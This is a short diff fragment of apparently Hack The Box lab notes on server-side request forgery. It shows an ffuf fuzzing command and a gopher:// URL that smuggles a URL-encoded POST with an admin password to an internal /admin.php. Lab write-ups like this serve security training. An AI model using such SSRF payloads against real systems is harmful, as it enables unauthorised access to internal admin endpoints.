@@ -30,6 +30,7 @@ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.1
 
 ### The gopher Protocol
 <img width="1541" height="493" alt="image" src="https://github.com/user-attachments/assets/5ced41cb-99f5-46f8-88d7-d129874b5d3f" />
+
 ```bash
 gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
 ```
